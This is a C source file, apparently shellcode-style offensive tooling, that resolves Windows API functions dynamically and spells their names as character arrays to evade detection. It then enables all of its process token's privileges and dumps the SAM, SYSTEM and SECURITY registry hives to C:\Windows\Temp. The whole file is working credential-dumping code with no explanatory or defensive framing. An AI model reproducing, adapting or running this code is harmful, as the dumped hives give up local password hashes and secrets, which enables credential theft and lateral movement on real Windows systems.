#include "addresshunter.h"
#include <stdio.h>
#include <inttypes.h>
 
typedef HMODULE(WINAPI* LOADLIBRARYA)(LPCSTR);
typedef BOOL(WINAPI* OPENPROCESSTOKEN)(HANDLE, DWORD, PHANDLE);
typedef BOOL(WINAPI* GETTOKENINFORMATION)(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
typedef BOOL(WINAPI* ADJUSTTOKENPRIVILEGES)(HANDLE,BOOL,PTOKEN_PRIVILEGES,DWORD,PTOKEN_PRIVILEGES,PDWORD);
typedef NTSTATUS(NTAPI* NTOPENKEYEX)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,ULONG);
typedef NTSTATUS(NTAPI* NTSAVEKEYEX)(HANDLE,HANDLE,ULONG);
typedef NTSTATUS(NTAPI* NTCREATEFILE)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,PIO_STATUS_BLOCK,PLARGE_INTEGER,ULONG,ULONG,ULONG,ULONG,PVOID,ULONG);
typedef void(WINAPI* RTLINITUNICODESTRING)(PUNICODE_STRING,PCWSTR);
typedef int(WINAPI* WPRINTF)(const wchar_t* format, ...);
typedef void*(WINAPI* MALLOC)(size_t size);


BOOL dump(WCHAR* file,WCHAR* key){
    UINT64 ntdll = GetNtdll();
    HANDLE hFile;
    HANDLE hKey;
    CHAR ntopenkeyex[] = {'N','t','O','p','e','n','K','e','y','E','x',0};
    CHAR rtlinitunicodestring[] = {'R','t','l','I','n','i','t','U','n','i','c','o','d','e','S','t','r','i','n','g',0};
    CHAR ntcreatefile[] = {'N','t','C','r','e','a','t','e','F','i','l','e',0};
    CHAR ntsavekeyex[] = {'N','t','S','a','v','e','K','e','y','E','x',0};
    NTOPENKEYEX myNtOpenKeyEx = (NTOPENKEYEX)GetSymbolAddress((HANDLE)ntdll,ntopenkeyex);
    NTSAVEKEYEX myNtSaveKeyEx = (NTSAVEKEYEX)GetSymbolAddress((HANDLE)ntdll,ntsavekeyex);
    NTCREATEFILE myNtCreateFile = (NTCREATEFILE)GetSymbolAddress((HANDLE)ntdll,ntcreatefile);
    RTLINITUNICODESTRING myRtlInitUnicodeString = (RTLINITUNICODESTRING)GetSymbolAddress((HANDLE)ntdll,rtlinitunicodestring);
    UNICODE_STRING ukey;
    UNICODE_STRING ufile;
    
    IO_STATUS_BLOCK io;
    myRtlInitUnicodeString(&ukey,key);
    myRtlInitUnicodeString(&ufile,file);
    OBJECT_ATTRIBUTES oakey = {sizeof(OBJECT_ATTRIBUTES),0x00,&ukey,OBJ_CASE_INSENSITIVE};
    OBJECT_ATTRIBUTES oafile = {sizeof(OBJECT_ATTRIBUTES),0x00,&ufile,OBJ_CASE_INSENSITIVE};;
    if(myNtCreateFile(&hFile,FILE_GENERIC_WRITE|FILE_GENERIC_READ,&oafile,&io,NULL,FILE_ATTRIBUTE_NORMAL,FILE_SHARE_WRITE|FILE_SHARE_READ,FILE_OPEN_IF,FILE_OPEN_FOR_BACKUP_INTENT|FILE_SYNCHRONOUS_IO_ALERT,NULL,0) != 0){
        return FALSE;
    }
    if(myNtOpenKeyEx(&hKey,KEY_ALL_ACCESS,&oakey,REG_OPTION_BACKUP_RESTORE)!= 0){
        return FALSE;
    }
    if(myNtSaveKeyEx(hKey,hFile,4)!=0){
        return FALSE;
    }



    return TRUE;
}

void run(){
    
    WCHAR samsuccess[] ={L'S',L'U',L'C',L'C',L'E',L'S',L'S',L'!',L' ',L'S',L'A',L'M',L' ',L'd',L'u',L'm',L'p',L'e',L'd',L' ',L'>',L' ',L'C',L':',L'\\',L'W',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L'T',L'e',L'm',L'p',L'\\',L'S',L'A',L'M',L'.',L'h',L'i',L'v',L'e',L'\n',0};
    WCHAR systemsuccess[] = {L'S',L'U',L'C',L'C',L'E',L'S',L'S',L'!',L' ',L'S',L'Y',L'S',L'T',L'E',L'M',L' ',L'd',L'u',L'm',L'p',L'e',L'd',L' ',L'>',L' ',L'C',L':',L'\\',L'W',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L'T',L'e',L'm',L'p',L'\\',L'S',L'Y',L'S',L'T',L'E',L'M',L'.',L'h',L'i',L'v',L'e','\n',0};
    WCHAR securitysuccess[] = {L'S',L'U',L'C',L'C',L'E',L'S',L'S',L'!',L' ',L'S',L'E',L'C',L'U',L'R',L'I',L'T',L'Y',L' ',L'd',L'u',L'm',L'p',L'e',L'd',L' ',L'>',L' ',L'C',L':',L'\\',L'W',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L'T',L'e',L'm',L'p',L'\\',L'S',L'E',L'C',L'U',L'R',L'I',L'T',L'Y',L'.',L'h',L'i',L'v',L'e','\n',0};

    WCHAR samsave[] = {L'\\',L'?',L'?',L'\\',L'C',L':',L'\\',L'W',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L'T',L'e',L'm',L'p',L'\\',L'S',L'A',L'M',L'.',L'h',L'i',L'v',L'e',0};
    WCHAR systemsave[] = {L'\\',L'?',L'?',L'\\',L'C',L':',L'\\',L'W',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L'T',L'e',L'm',L'p',L'\\',L'S',L'Y',L'S',L'T',L'E',L'M',L'.',L'h',L'i',L'v',L'e',0};
    WCHAR securitysave[] = {L'\\',L'?',L'?',L'\\',L'C',L':',L'\\',L'W',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L'T',L'e',L'm',L'p',L'\\',L'S',L'E',L'C',L'U',L'R',L'I',L'T',L'Y',L'.',L'h',L'i',L'v',L'e',0};
    WCHAR sam[] = {L'\\',L'R',L'e',L'g',L'i',L's',L't',L'r',L'y',L'\\',L'M',L'a',L'c',L'h',L'i',L'n',L'e',L'\\',L'S',L'A',L'M',0};
    WCHAR system[] = {L'\\',L'R',L'e',L'g',L'i',L's',L't',L'r',L'y',L'\\',L'M',L'a',L'c',L'h',L'i',L'n',L'e',L'\\',L'S',L'Y',L'S',L'T',L'E',L'M',0};
    WCHAR security[] =  {L'\\',L'R',L'e',L'g',L'i',L's',L't',L'r',L'y',L'\\',L'M',L'a',L'c',L'h',L'i',L'n',L'e',L'\\',L'S',L'E',L'C',L'U',L'R',L'I',L'T',L'Y',0};

    CHAR msvcrtdll[] = {'m','s','v','c','r','t','.','d','l','l',0};
    CHAR loadlibrarya[] = {'L','o','a','d','L','i','b','r','a','r','y','A',0};
    CHAR malloc_c[] = {'m','a','l','l','o','c',0};
    CHAR advapi32dll[] = {'a','d','v','a','p','i','3','2','.','d','l','l',0};
    CHAR wprintf_c[] = {'w','p','r','i','n','t','f',0};
    CHAR gettokeninformation[] = {'G','e','t','T','o','k','e','n','I','n','f','o','r','m','a','t','i','o','n',0};
    CHAR adjusttokenprivileges[] = {'A','d','j','u','s','t','T','o','k','e','n','P','r','i','v','i','l','e','g','e','s',0};
    CHAR openprocesstoken[] = {'O','p','e','n','P','r','o','c','e','s','s','T','o','k','e','n',0};
    
    
    UINT64 k32 = GetKernel32();
    LOADLIBRARYA myLoadLibraryA = (LOADLIBRARYA)GetSymbolAddress((HANDLE)k32, loadlibrarya);
    
    
    UINT64 mscv = (UINT64)myLoadLibraryA(msvcrtdll);
    WPRINTF mywprintf = (WPRINTF)GetSymbolAddress((HANDLE)mscv,wprintf_c);
    MALLOC mymalloc = (MALLOC)GetSymbolAddress((HANDLE)mscv,malloc_c);

    UINT64 advapi32 = (UINT64)myLoadLibraryA(advapi32dll);
    GETTOKENINFORMATION myGetTokenInformation = (GETTOKENINFORMATION)GetSymbolAddress((HANDLE)advapi32,gettokeninformation);
    ADJUSTTOKENPRIVILEGES myAdjustTokenPrivileges = (ADJUSTTOKENPRIVILEGES)GetSymbolAddress((HANDLE)advapi32,adjusttokenprivileges);
    OPENPROCESSTOKEN myOpenProcessToken = (OPENPROCESSTOKEN)GetSymbolAddress((HANDLE)advapi32,openprocesstoken);

    HANDLE hToken;
    DWORD sizeneeded;
    PTOKEN_PRIVILEGES privs;

    if(myOpenProcessToken((HANDLE)-1,TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken)){
        myGetTokenInformation(hToken,TokenPrivileges,NULL,0,&sizeneeded);
        privs = (PTOKEN_PRIVILEGES)mymalloc(sizeneeded);
        if(myGetTokenInformation(hToken,TokenPrivileges,privs,sizeneeded,&sizeneeded)){
            for(int i = 0;i<privs->PrivilegeCount;i++){
                privs->Privileges[i].Attributes |= SE_PRIVILEGE_ENABLED;
                }
            if(myAdjustTokenPrivileges(hToken,FALSE,privs,0,NULL,NULL)){
                if(dump(samsave,sam)){
                    mywprintf(samsuccess);
                    if(dump(systemsave,system)){
                        mywprintf(systemsuccess);{
                            if(dump(securitysave,security)){
                                mywprintf(securitysuccess);
                            }
                        }
                    }
                }
            }
        }
    }
}